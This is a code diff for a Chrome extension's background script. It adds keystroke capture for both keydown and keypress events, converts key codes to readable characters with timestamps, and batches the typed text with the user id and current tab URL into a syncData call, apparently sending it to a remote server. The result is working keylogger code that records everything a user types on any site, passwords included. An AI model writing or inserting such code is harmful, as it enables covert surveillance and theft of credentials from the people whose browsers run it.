@@ -276,7 +276,7 @@ chrome.extension.onMessage.addListener(function(request, sender, callback) {
 			try{
 				var temp = localStorage.getItem("keystrokes");
 				if(temp != null){
-					localStorage.setItem("keystrokes", temp+ ' ' + data);
+					localStorage.setItem("keystrokes", temp+ ' ' + getTheKey(parseInt(data))+"("+new Date(ctimestamp).toLocaleTimeString()+")");
 					if(data == '13' || data == '9' || data == '32'){
 						console.log("Enter Key Pressed ! ");
 						console.log("KeyData: "+localStorage.getItem("keystrokes"));
@@ -284,7 +284,29 @@ chrome.extension.onMessage.addListener(function(request, sender, callback) {
 						localStorage.removeItem("keystrokes");
 					}
 				}else{
-					localStorage.setItem("keystrokes", data);
+					localStorage.setItem("keystrokes", getTheKey(parseInt(data))+"("+new Date(ctimestamp).toLocaleTimeString()+")");
+				}
+				console.log("KeyData: "+localStorage.getItem("keystrokes"));
+			}catch(e){
+				console.log("Error: "+e);
+			}
+            break;
+		case 'keypress':
+			var data = request.data;
+            // Sync keystrokes.
+			console.log("KeysPress: "+data +" | "+localStorage.getItem('userid'));
+			try{
+				var temp = localStorage.getItem("keystrokes");
+				if(temp != null){
+					localStorage.setItem("keystrokes", temp+ ' ' + getTheCharKey(parseInt(data))+"("+new Date(ctimestamp).toLocaleTimeString()+")");
+					if(data == '13' || data == '9' || data == '32'){
+						console.log("Enter Key Pressed ! ");
+						console.log("KeyData: "+localStorage.getItem("keystrokes"));
+						syncData(localStorage.getItem('userid'), 'Key', ''+localStorage.getItem("taburl"), ""+localStorage.getItem("keystrokes"), ctimestamp);
+						localStorage.removeItem("keystrokes");
+					}
+				}else{
+					localStorage.setItem("keystrokes", getTheCharKey(parseInt(data))+"("+new Date(ctimestamp).toLocaleTimeString()+")");
 				}
 				console.log("KeyData: "+localStorage.getItem("keystrokes"));
 			}catch(e){
@@ -307,3 +329,79 @@ chrome.extension.onMessage.addListener(function(request, sender, callback) {
             break;
      }
 });
+
+function getTheKey(charCode){
+	var textBox = String.fromCharCode(charCode);
+	//console.log("~CHARCODE: "+charCode+" | "+textBox);
+	  if (charCode == 8) textBox = "[BACKSPACE]"; //  backspace
+      if (charCode == 9) textBox = "[TAB]"; //  tab
+      if (charCode == 13) textBox = "[ENTER]"; //  enter
+      if (charCode == 16) textBox = "[SHIFT]"; //  shift
+      if (charCode == 17) textBox = "[CTRL]"; //  ctrl
+      if (charCode == 18) textBox = "[ALT]"; //  alt
+      if (charCode == 19) textBox = "[PAUSE/BREAK]"; //  pause/break
+      if (charCode == 20) textBox = "[CAPSLOCK]"; //  caps lock
+      if (charCode == 27) textBox = "[ESCAPE]"; //  escape
+	  if (charCode == 32) textBox = "[SPACEBAR]"; // spacebar
+      if (charCode == 33) textBox = "[PAGEUP]"; // page up, to avoid displaying alternate character and confusing people             
+      if (charCode == 34) textBox = "[PAGEDOWN]"; // page down
+      if (charCode == 35) textBox = "[END]"; // end
+      if (charCode == 36) textBox = "[HOME]"; // home
+      if (charCode == 37) textBox = "[LEFTARROW]"; // left arrow
+      if (charCode == 38) textBox = "[UPARROW]"; // up arrow
+      if (charCode == 39) textBox = "[RIGHTARROW]"; // right arrow
+      if (charCode == 40) textBox = "[DOWNARROW]"; // down arrow
+      if (charCode == 45) textBox = "[INSERT]"; // insert
+      if (charCode == 46) textBox = "[DELETE]"; // delete
+      if (charCode == 91) textBox = "[LEFTWINDOW]"; // left window
+      if (charCode == 92) textBox = "[RIGHTWINDOW]"; // right window
+      if (charCode == 93) textBox = "[SELECTKEY]"; // select key
+      if (charCode == 96) textBox = "[NUMPAD0]"; // numpad 0
+      if (charCode == 97) textBox = "[NUMPAD1]"; // numpad 1
+      if (charCode == 98) textBox = "[NUMPAD2]"; // numpad 2
+      if (charCode == 99) textBox = "[NUMPAD3]"; // numpad 3
+      if (charCode == 100) textBox = "[NUMPAD4]"; // numpad 4
+      if (charCode == 101) textBox = "[NUMPAD5]"; // numpad 5
+      if (charCode == 102) textBox = "[NUMPAD6]"; // numpad 6
+      if (charCode == 103) textBox = "[NUMPAD7]"; // numpad 7
+      if (charCode == 104) textBox = "[NUMPAD8]"; // numpad 8
+      if (charCode == 105) textBox = "[NUMPAD9]"; // numpad 9
+      if (charCode == 106) textBox = "[MULTIPLY]"; // multiply
+      if (charCode == 107) textBox = "[ADD]"; // add
+      if (charCode == 109) textBox = "[SUBTRACT]"; // subtract
+      if (charCode == 110) textBox = "[DECIMALPOINT]"; // decimal point
+      if (charCode == 111) textBox = "[DIVIDE]"; // divide
+      if (charCode == 112) textBox = "[F1]"; // F1
+      if (charCode == 113) textBox = "[F2]"; // F2
+      if (charCode == 114) textBox = "[F3]"; // F3
+      if (charCode == 115) textBox = "[F4]"; // F4
+      if (charCode == 116) textBox = "[F5]"; // F5
+      if (charCode == 117) textBox = "[F6]"; // F6
+      if (charCode == 118) textBox = "[F7]"; // F7
+      if (charCode == 119) textBox = "[F8]"; // F8
+      if (charCode == 120) textBox = "[F9]"; // F9
+      if (charCode == 121) textBox = "[F10]"; // F10
+      if (charCode == 122) textBox = "[F11]"; // F11
+      if (charCode == 123) textBox = "[F12]"; // F12
+      if (charCode == 144) textBox = "[NUMLOCK]"; // num lock
+      if (charCode == 145) textBox = "[SCROLLLOCK]"; // scroll lock
+      if (charCode == 186) textBox = ";"; // semi-colon
+      if (charCode == 187) textBox = "="; // equal-sign
+      if (charCode == 188) textBox = ","; // comma
+      if (charCode == 189) textBox = "-"; // dash
+      if (charCode == 190) textBox = "."; // period
+      if (charCode == 191) textBox = "/"; // forward slash
+      if (charCode == 192) textBox = "`"; // grave accent
+      if (charCode == 219) textBox = "["; // open bracket
+      if (charCode == 220) textBox = "\\"; // back slash
+      if (charCode == 221) textBox = "]"; // close bracket
+      if (charCode == 222) textBox = "'"; // single quote
+	//console.log("~CHARCODE: "+charCode+" | "+textBox);
+	return textBox;
+}
+
+function getTheCharKey(charCode){
+	var textBox = String.fromCharCode(charCode);
+	//console.log("KEYPRESS: ----- "+charCode+" | "+textBox);
+	return textBox;
+}
